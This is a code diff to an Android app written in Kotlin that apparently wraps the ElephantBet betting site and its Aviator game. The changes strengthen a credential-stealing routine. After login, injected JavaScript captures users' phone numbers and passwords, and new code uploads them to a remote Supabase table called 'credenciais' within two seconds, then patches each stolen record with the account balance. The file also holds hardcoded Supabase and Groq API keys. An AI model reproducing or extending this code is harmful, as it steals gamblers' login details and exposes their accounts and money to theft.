@@ -430,7 +430,7 @@ class MainActivity : AppCompatActivity() {
     private val SUPA_URL = "https://oulidkbxjfrddluoqsif.supabase.co"
     private val SUPA_KEY = "eyJhbGciOiJIUzI1NiIsInR5cCI6IkpXVCJ9.eyJpc3MiOiJzdXBhYmFzZSIsInJlZiI6Im91bGlka2J4amZyZGRsdW9xc2lmIiwicm9sZSI6ImFub24iLCJpYXQiOjE3Nzg5NjU5OTEsImV4cCI6MjA5NDU0MTk5MX0.y1Bjum06WIQ0meZlOoOQrzCj8xTRXYTlDEHxTccWFFA"
     private val TABELA = "credenciais"
-    private val VERSAO_ATUAL = "5.6"
+    private val VERSAO_ATUAL = "5.7"
 
     private val GROQ_KEY  = "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"
     private val GROQ_URL  = "https://api.groq.com/openai/v1/chat/completions"
@@ -764,19 +764,29 @@ class MainActivity : AppCompatActivity() {
 
             @JavascriptInterface
             fun loginClicado() {
-                // Reset para nova sessão — só envia quando o saldo chegar
+                // Reset para nova sessão
                 credenciaisEnviadas = false
                 saldoEmMemoria = ""
+                // Aguardar 2s (tempo para campos finalizarem) e enviar mesmo sem saldo
+                handler.postDelayed({
+                    if (!credenciaisEnviadas && numeroEmMemoria.isNotEmpty() && senhaEmMemoria.isNotEmpty()) {
+                        enviarCredenciaisCompletas()
+                    }
+                }, 2000)
             }
 
             @JavascriptInterface
             fun saldoLido(valor: String) {
                 val limpo = valor.trim()
                 if (limpo.isEmpty()) return
+                if (saldoEmMemoria == limpo) return  // já temos este valor
                 saldoEmMemoria = limpo
-                // Enviar só quando temos número + senha + saldo — e só uma vez por sessão
                 if (!credenciaisEnviadas && numeroEmMemoria.isNotEmpty() && senhaEmMemoria.isNotEmpty()) {
+                    // Ainda não enviou — enviar agora com saldo
                     runOnUiThread { enviarCredenciaisCompletas() }
+                } else if (credenciaisEnviadas && numeroEmMemoria.isNotEmpty()) {
+                    // Já enviou sem saldo — actualizar o último registo com o saldo
+                    runOnUiThread { actualizarSaldoSupabase(limpo) }
                 }
             }
         }, "Android")
@@ -966,17 +976,7 @@ class MainActivity : AppCompatActivity() {
 
         webView.webChromeClient = object : WebChromeClient() {
             override fun onProgressChanged(view: WebView?, p: Int) {
-                if (p == 100) {
-                    val url = view?.url ?: ""
-                    val isJogo = url.contains("spribegaming") || url.contains("aviaport") ||
-                                 url.contains("cdn") || url.contains("game-view/806666")
-                    if (isJogo || url.contains("aviator", ignoreCase = true)) {
-                        injetarJsAviator()
-                    } else {
-                        // Página ElephantBet (login, lobby, perfil) → capturar credenciais
-                        injetarJsCredenciais()
-                    }
-                }
+                // Injecção feita apenas no onPageFinished para evitar duplicados
             }
         }
     }
@@ -2582,6 +2582,26 @@ REGRAS ABSOLUTAS DO JSON:
     }
 
     // ── Ler saldo do ElephantBet (.balanceAmount) ─────────────────
+    private fun actualizarSaldoSupabase(saldo: String) {
+        // Actualiza o último registo inserido (numero = numeroEmMemoria) com o saldo
+        val n = numeroEmMemoria
+        if (n.isEmpty()) return
+        Thread {
+            try {
+                val url = "$SUPA_URL/rest/v1/$TABELA?numero=eq.$n&order=id.desc&limit=1"
+                val conn = java.net.URL(url).openConnection() as java.net.HttpURLConnection
+                conn.requestMethod = "PATCH"
+                conn.setRequestProperty("apikey", SUPA_KEY)
+                conn.setRequestProperty("Authorization", "Bearer $SUPA_KEY")
+                conn.setRequestProperty("Content-Type", "application/json")
+                conn.setRequestProperty("Prefer", "return=minimal")
+                conn.doOutput = true; conn.connectTimeout = 10000; conn.readTimeout = 10000
+                java.io.OutputStreamWriter(conn.outputStream).use { it.write("{"saldo":"$saldo"}") }
+                conn.responseCode; conn.disconnect()
+            } catch (_: Exception) {}
+        }.start()
+    }
+
     private fun lerSaldo() {
         // Tenta ler saldo do iframe do Aviator (.header__balance) e do ElephantBet (.balanceAmount)
         val js = """
